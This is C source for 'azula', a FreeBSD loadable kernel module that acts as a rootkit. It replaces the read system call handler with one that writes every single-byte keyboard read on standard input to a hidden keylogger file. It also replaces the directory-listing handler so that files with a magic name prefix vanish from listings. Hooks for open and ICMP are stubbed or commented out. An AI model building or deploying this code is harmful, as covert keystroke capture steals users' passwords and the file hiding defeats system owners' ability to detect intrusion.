#include "azula.h"


// Might not work yet
static int azula_open(struct thread *td, void *syscall_arg){
    struct open_args *uap;
    uap = (struct open_args *)syscall_arg;

    int error;
    ssize_t done;
    char filename[1024];
    // original call
    error = sys_open(td, syscall_arg);
    // uprintf("Result code: %d\n", error);

    // if (error){
    //     return(error);
    // }
    copyinstr(uap->path, filename, 1024, &done);
    // uprintf("Path is %s\n", uap->path);
    // uprintf("Flags are %d", uap->flags);
    // uprintf("Mode is %d", uap->mode);

    return (error);
}

static int logger(struct thread *td, char c){
    int error;
    error = kern_openat(td, AT_FDCWD, KEYLOGGER, UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (error){

    }

    int buf[1] = {c};
    int file_descriptor = td->td_retval[0];
    struct iovec aiov;
    struct uio auio;

    aiov.iov_base = &buf;
    aiov.iov_len = 1;
    auio.uio_iov = &aiov;
    auio.uio_iovcnt = 1;
    //auio.uio_offset = 0;
    auio.uio_resid = 1;
    auio.uio_segflg = UIO_SYSSPACE;
    auio.uio_rw = UIO_WRITE;
    auio.uio_td = td;

    error = kern_writev(td, file_descriptor, &auio);
    if (error){
        return error;
    }

    struct close_args fdtmp;
    fdtmp.fd = file_descriptor;
    sys_close(td, &fdtmp);
    return(error);
}

static int azula_read(struct thread *td, void *syscall_arg){
    struct read_args *uap;
    uap = (struct read_args *)syscall_arg;

    int error;
    char buffer[1];
    ssize_t done;

    // original syscall
    error = sys_read(td, syscall_arg);
    if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0)){
        return(error);
    }

    copyinstr(uap->buf, buffer, 1, &done);
    
    // #if VERBOSE
    //     uprintf("Input was %c\n", buffer[0]);
    // #endif

    // save to a file
    logger(td, buffer[0]);
    

    return (error);
}

static int azula_getdirentries(struct thread *td, void *syscall_args){
    struct getdirentries_args *uap;
    uap = (struct getdirentries_args *)syscall_args;

    unsigned int directory_content, count;
    struct dirent *dp, *current;

    // Make original call
    sys_getdirentries(td, syscall_args);

    // get the numbers of bytes of the directory listing
    directory_content = td->td_retval[0];

    if (directory_content > 0){
    //     // HERE"S THE ISSUE -- FUCK FREEBSD
    //     //MALLOC(dp, struct dirent*, directory_content, M_TEMP, M_NOWAIT);

        dp = malloc(directory_content, M_TEMPBUFFER, M_NOWAIT);
        // Copy the dirent struct from user buffer into kernel
        copyin(uap->buf, dp, directory_content);

        // Point to the first entry
        current = dp;
        count = directory_content;

        #if VERBOSE
            uprintf("CURRENT LENGTH: %d\n", current->d_reclen);
            uprintf("CURRENT TYPE: %d\n", current->d_type);
            uprintf("CURRENT NAME: %s\n", current->d_name);
            uprintf("COUNT: %d\n", count);
        #endif

        // Iterate through directory entries
        while ((current->d_reclen != 0) && (count > 0)){
            /* code */
            count -= current->d_reclen;

            #if VERBOSE 
                uprintf("FILE NAME: %s\n", current->d_name);
            #endif

            if(memcmp((char *)&(current->d_name), MAGIC_PREFIX, 5) == 0){
                #if VERBOSE
                    uprintf("same length\n");
                #endif

                if (count != 0){
                    bcopy((char *)current + current->d_reclen, current, count);
                }

                directory_content -= current->d_reclen;
                break;
            }

            if (count != 0){
                current = (struct dirent *)((char *)current + current->d_reclen);
            }
        }


        td->td_retval[0] = directory_content;
        copyout(dp, uap->buf, directory_content);

        free(dp, M_TEMPBUFFER);
        
    }
    return (0);
}

// Abandon this for now
struct sys_args{
    char *option;
};

static int azula_handler(struct thread *t, void *args){

    return(0);
}

static struct sysent handler = {
    0, /* number of argument */
    azula_handler /* impementing function */
};


static int offset = 217;

static int load(struct module *module, int cmd, void *args){
    int error = 0;
    switch (cmd){
        case MOD_LOAD:
        #if VERBOSE
            uprintf("Module Loaded\n");
        #endif
            sysent[SYS_getdirentries].sy_call = (sy_call_t *)azula_getdirentries;
            sysent[SYS_read].sy_call = (sy_call_t *)azula_read;
            // inetsw[ip_protox[IPPROTO_ICMP]].pr_input = azula_icmp_hook;
            // sysent[SYS_open].sy_call = (sy_call_t *)azula_open;
            break;
        case MOD_UNLOAD:
        #if VERBOSE
            uprintf("Module Unloaded\n");
        #endif
            sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
            sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
            // inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;          
            // sysent[SYS_open].sy_call = (sy_call_t *)sys_open;
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }
    return(error);
}

SYSCALL_MODULE(azula, &offset, &handler, load, 0);
